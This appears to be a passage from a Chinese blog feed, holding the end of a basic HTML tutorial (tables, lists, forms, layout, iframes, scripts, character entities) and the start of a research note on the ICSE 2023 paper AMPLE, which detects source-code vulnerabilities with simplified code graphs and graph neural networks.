class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>列标题1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>列标题2<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>列标题3<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行1，列1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行1，列2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行1，列3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行2，列1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行2，列2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行2，列3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HTML 表格还可以具有其他部分，如 <code>&lt;tfoot&gt; </code>（表格页脚）和 <code>&lt;caption&gt;</code> （表格标题），<code>&lt;tfoot&gt;</code> 可用于在表格的底部定义摘要、统计信息等内容。 <code>&lt;caption&gt;</code> 可用于为整个表格定义标题。</p><p>HTML 表格还支持合并单元格和跨行&#x2F;跨列的操作，以及其他样式和属性的应用，以满足各种需求。我们也可以使用 CSS 来进一步自定义表格的样式和外观。</p></li></ol><h1 id="HTML列表"><a href="#HTML列表" class="headerlink" title="HTML列表"></a>HTML列表</h1><ol><li><p><strong>无序列表</strong>：使用粗体圆点（典型的小黑圆圈）进行标记。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>有序列表</strong>：使用数字进行标记</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>自定义列表</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>- black hot drink<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>- white cold drink<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="HTML表单"><a href="#HTML表单" class="headerlink" title="HTML表单"></a>HTML表单</h1><p>HTML 表单用于收集用户的输入信息，表示文档中的一个区域，此区域包含交互控件，将用户收集到的信息发送到 Web 服务器。</p><p>HTML 表单通常包含各种输入字段、复选框、单选按钮、下拉列表等元素。</p><p>例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 文本输入框 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 密码输入框 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 单选按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>性别:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;male&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;male&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;female&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;female&quot;</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 复选框 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;subscribe&quot;</span> <span class="attr">name</span>=<span class="string">&quot;subscribe&quot;</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;subscribe&quot;</span>&gt;</span>订阅推送信息<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 下拉列表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;country&quot;</span>&gt;</span>国家:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;country&quot;</span> <span class="attr">name</span>=<span class="string">&quot;country&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;cn&quot;</span>&gt;</span>CN<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;uk&quot;</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 提交按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>&lt;form&gt;</code> 元素用于创建表单，<code>action</code> 属性定义了表单数据提交的目标 URL</p></li><li><p><code>method</code> 属性定义了提交数据的 HTTP 方法。</p><ul><li><strong>post</strong>：指的是 HTTP POST 方法，表单数据会包含在表单体内然后发送给服务器，用于提交敏感数据，如用户名与密码等。</li><li><strong>get</strong>：默认值，指的是 HTTP GET 方法，表单数据会附加在 <strong>action</strong> 属性的 URL 中，并以 <code>?</code>作为分隔符，一般用于不敏感信息，如分页等。例如：<a href="https://www.runoob.com/?page=1%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84">https://www.runoob.com/?page=1，这里的</a> page&#x3D;1 就是 get 方法提交的数据。</li></ul></li><li><p><code>&lt;label&gt;</code> 元素用于为表单元素添加标签，提高可访问性。</p></li><li><p><code>&lt;input&gt;</code> 元素是最常用的表单元素之一，它可以创建文本输入框、密码框、单选按钮、复选框等。<code>type</code> 属性定义了输入框的类型，<code>id</code> 属性用于关联 <code>&lt;label&gt;</code> 元素，<code>name</code> 属性用于标识表单字段。</p><ul><li><p>常见的type属性类型</p><ul><li><p>text</p></li><li><p>password：不会明文显示</p></li><li><p>radio：单选</p></li><li><p>checkbox：复选</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;vehicle[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bike&quot;</span>&gt;</span>我喜欢自行车<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;vehicle[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Car&quot;</span>&gt;</span>我喜欢小汽车</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240710193501024.png" alt="image-20240710193501024"></p></li><li><p>submit：提交</p></li></ul></li></ul></li><li><p><code>&lt;select&gt;</code> 元素用于创建下拉列表，而 <code>&lt;option&gt;</code> 元素用于定义下拉列表中的选项。</p></li></ul><h1 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h1><p>布局即为：将内容安排到多个列中（像杂志或报纸那样），可以使用<code>&lt;div&gt;</code> 或 <code>&lt;table&gt;</code> 来实现。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:500px&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;header&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#FFA500;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;margin-bottom:0;&quot;</span>&gt;</span>主要的网页标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;menu&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#FFD700;height:200px;width:100px;float:left;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>菜单<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">HTML<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">CSS<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">JavaScript<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#EEEEEE;height:200px;width:400px;float:left;&quot;</span>&gt;</span></span><br><span class="line">内容在这里<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#FFA500;clear:both;text-align:center;&quot;</span>&gt;</span></span><br><span class="line">版权 © runoob.com<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><ul><li><code>&lt;div id=&quot;container&quot; style=&quot;width:500px&quot;&gt;</code> ：整个页面容器，宽度为500像素</li><li><code>&lt;div id=&quot;header&quot;&gt;</code> ：页眉部分，背景色为橙色。</li><li><code>&lt;div id=&quot;menu&quot;&gt;</code> ：菜单部分，背景色为淡黄色，高度200像素，宽度100像素，并使用了float:left;使其浮动在左侧。</li><li><code>&lt;div id=&quot;content&quot;&gt;</code> ：内容部分，背景色为淡灰色，高度200像素，宽度400像素，并使用了float:left;使其浮动在左侧，使得菜单和内容并排显示。</li><li><code>&lt;div id=&quot;footer&quot;&gt;</code> ：页脚部分，背景色为橙色，使用了clear:both;确保在内容下方显示，并设置了居中对齐。</li></ul></blockquote><p>由于创建高级的布局非常耗时，使用模板是一个快速的选项。通过搜索引擎可以找到很多免费的网站模板（您可以使用这些预先构建好的网站布局，并优化它们）。</p><h1 id="iframe-框架"><a href="#iframe-框架" class="headerlink" title="iframe(框架)"></a>iframe(框架)</h1><p>通过使用 iframe，你可以在同一个浏览器窗口中显示不止一个页面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;URL&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><strong>使用 iframe 来显示目标链接页面</strong></p><p>iframe 可以显示一个目标链接的页面，目标链接的属性必须使用 iframe 的属性，如下实例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;demo_iframe.htm&quot;</span> <span class="attr">name</span>=<span class="string">&quot;iframe_a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;iframe_a&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener&quot;</span>&gt;</span>RUNOOB.COM<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240710194643458.png" alt="image-20240710194643458"></p><p>点击之后，iframe中就会显示指向的url</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240710194655201.png" alt="image-20240710194655201"></p><h1 id="HTML脚本"><a href="#HTML脚本" class="headerlink" title="HTML脚本"></a>HTML脚本</h1><ul><li><p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。<code>&lt;script&gt;</code> 元素既可包含脚本语句，也可通过 src 属性指向外部脚本文件。通常用于图片操作、表单验证以及内容动态更新。</p></li><li><p><code>&lt;noscript&gt;</code>  元素可包含普通 HTML 页面的 body 元素中能够找到的所有元素。</p><p>只有在浏览器不支持脚本或者禁用脚本时，才会显示 <code>&lt;noscript&gt;</code> 元素中的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&quot;Hello World!&quot;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;noscript&gt;抱歉，你的浏览器不支持 JavaScript!&lt;/noscript&gt;</span><br></pre></td></tr></table></figure></li></ul><p>关于JS的学习会另写一篇博客</p><h1 id="HTML字符实体"><a href="#HTML字符实体" class="headerlink" title="HTML字符实体"></a>HTML字符实体</h1><p>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。如果想要显示这些字符，我们需要将这些预留字符替换为字符实体</p><table><thead><tr><th align="left">显示结果</th><th align="left">描述</th><th align="left">实体名称</th><th align="left">实体编号</th></tr></thead><tbody><tr><td align="left"></td><td align="left">空格</td><td align="left">&nbsp;</td><td align="left">&#160;</td></tr><tr><td align="left">&lt;</td><td align="left">小于号</td><td align="left">&lt;</td><td align="left">&#60;</td></tr><tr><td align="left">&gt;</td><td align="left">大于号</td><td align="left">&gt;</td><td align="left">&#62;</td></tr><tr><td align="left">&amp;</td><td align="left">和号</td><td align="left">&amp;</td><td align="left">&#38;</td></tr><tr><td align="left">“</td><td align="left">引号</td><td align="left">&quot;</td><td align="left">&#34;</td></tr><tr><td align="left">‘</td><td align="left">撇号</td><td align="left">&apos; (IE不支持)</td><td align="left">&#39;</td></tr><tr><td align="left">￠</td><td align="left">分</td><td align="left">&cent;</td><td align="left">&#162;</td></tr><tr><td align="left">£</td><td align="left">镑</td><td align="left">&pound;</td><td align="left">&#163;</td></tr><tr><td align="left">¥</td><td align="left">人民币&#x2F;日元</td><td align="left">&yen;</td><td align="left">&#165;</td></tr><tr><td align="left">€</td><td align="left">欧元</td><td align="left">&euro;</td><td align="left">&#8364;</td></tr><tr><td align="left">§</td><td align="left">小节</td><td align="left">&sect;</td><td align="left">&#167;</td></tr><tr><td align="left">©</td><td align="left">版权</td><td align="left">&copy;</td><td align="left">&#169;</td></tr><tr><td align="left">®</td><td align="left">注册商标</td><td align="left">&reg;</td><td align="left">&#174;</td></tr><tr><td align="left">™</td><td align="left">商标</td><td align="left">&trade;</td><td align="left">&#8482;</td></tr><tr><td align="left">×</td><td align="left">乘号</td><td align="left">&times;</td><td align="left">&#215;</td></tr><tr><td align="left">÷</td><td align="left">除号</td><td align="left">&divide;</td><td align="left">&#247;</td></tr></tbody></table><ul><li><p>HTML 中的常用字符实体是不间断空格 <code>&amp;nbsp; </code>。</p><p>**浏览器总是会截短 HTML 页面中的空格。如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个。**如需在页面中增加空格的数量，您需要使用 <code>&amp;nbsp; </code>字符实体。</p></li><li><p>URL同样也需要转换成 ASCII 格式</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端开发 </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『论文笔记』Vulnerability Detection with Graph Simplification and Enhanced Graph Representation Learning</title>
      <link href="/posts/3fa7.html"/>
      <url>/posts/3fa7.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文标题：Vulnerability Detection with Graph Simplification and Enhanced Graph Representation Learning</em><br><em>原文作者：Xin-Cheng Wen; Yupan Chen; Cuiyun Gao; Cuiyun Gao; Jie M. Zhang</em><br><em>发表期刊：International Conference on Software Engineering (ICSE) 2023</em><br><em>原文链接：<a href="https://arxiv.org/pdf/2302.04675">https://arxiv.org/pdf/2302.04675</a></em><br><em>主题类型：源代码漏洞检测，深度学习</em><br><em>笔记作者：isoda</em><br><em>主编：黄诚@安全学术圈</em></p></blockquote><h1 id="1、研究介绍"><a href="#1、研究介绍" class="headerlink" title="1、研究介绍"></a>1、研究介绍</h1><p>图神经网络（GNN）已经被证明了在学习源代码的图表示方面的有效性，并且经常应用于现有的基于深度学习的漏洞检测方法中。然而，GNN仍然受到以下事实限制：</p><ul><li>因为专注于通过邻域聚合来学习节点的局部特征，GNN <strong>很难处理代码结构图中长距离节点之间的连接依赖</strong>，无法捕获图的全局信息。</li><li><strong>不能很好地利用代码结构图中的多种边类型</strong>（如表示数据流和控制流的边）。</li></ul><p>为了缓解这一问题，本文提出了一种新的漏洞检测框架AMPLE，主要包括图简化和增强的图表示学习两部分：<strong>1）图简化</strong>。通过缩小代码结构图的节点大小来减少节点之间的距离，使得GNN更容易处理长距离节点间的依赖关系； <strong>2）增强图表示学习</strong>。通过一个边感知图卷积网络模块将异构边信息融合到节点表示中，提高节点表示的准确性。并通过一个核尺度表示模块更好捕获远距离节点之间的关系，提升全局信息的学习效果。实验结果表明，AMPLE在准确性和F1分数方面显著优于现有方法，证明了其在捕捉代码图全局信息和提高漏洞检测效果方面的有效性。</p><h1 id="2、主要思路"><a href="#2、主要思路" class="headerlink" title="2、主要思路"></a>2、主要思路</h1><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611110609958.png" alt="image-20240611110609958"></p><p>AMPLE整体的流程图如上所示，框架总体来说分为图简化和增强图表示学习两个部分：首先从源代码中提取代码结构图，输入图简化模块，进行基于节点类型和变量类型的图简化；将简化完成后的代码结构图输入增强表示学习模块，通过边感知图卷积网络提取整个图的边增强节点表示矩阵，再通过双尺度卷积核来学习图的全局信息，最后通过两个全连接层和一个softmax函数进行二分类，判断源代码中是否存在漏洞。</p><h2 id="2-1、图简化"><a href="#2-1、图简化" class="headerlink" title="2.1、图简化"></a>2.1、图简化</h2><p>图简化部分旨在压缩代码结构图中的重复信息，从而缩小图的大小并减少节点之间的距离。该部分主要包括两个步骤：基于节点类型的图简化和基于节点变量的图简化。</p><ul><li><p><strong>基于节点类型的图简化</strong>：通过解析原则和手动检查代码结构图，作者提出了七条合并规则，如表1所示。对于每一对符合合并规则的相邻节点，删除子节点，因为其信息是父节点的细化，并且可以在后续节点中反映。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611113827591.png" alt="image-20240611113827591"></p><p>例如，下图中 <code>char *first = malloc(10)</code>  语句是一个标识符声明语句，红色虚线边框的节点就是作为它的子节点可以按照表中的规则2合并到其父节点。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611162758364.png" alt="image-20240611162758364"></p></li><li><p><strong>基于变量的图简化</strong>：将代码结构图中具有相同变量的叶子节点合并为一个节点，使得合并后的节点有多个父节点，可以同时聚合来自不同语句的信息。增强了节点表示的丰富性和准确性的同时并不会改变其父子层次信息。</p><p>例如下图中，“char str[15]”和“scanf(”%s”,str);”两个语句的子节点中都存在变量“str”，从而可以合并两个“str”叶节点，“scanf(”%s”,str);”将新的AST边连接合并后的“str”叶节点。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611163124981.png" alt="image-20240611163124981"></p></li></ul><h2 id="2-2、增强图表示学习"><a href="#2-2、增强图表示学习" class="headerlink" title="2.2、增强图表示学习"></a>2.2、增强图表示学习</h2><p>该部分主要包括两个模块：边感知图卷积网络模块和核尺度表示模块。</p><ul><li><p><strong>边感知图卷积网络</strong>（edge-aware graph convolutional 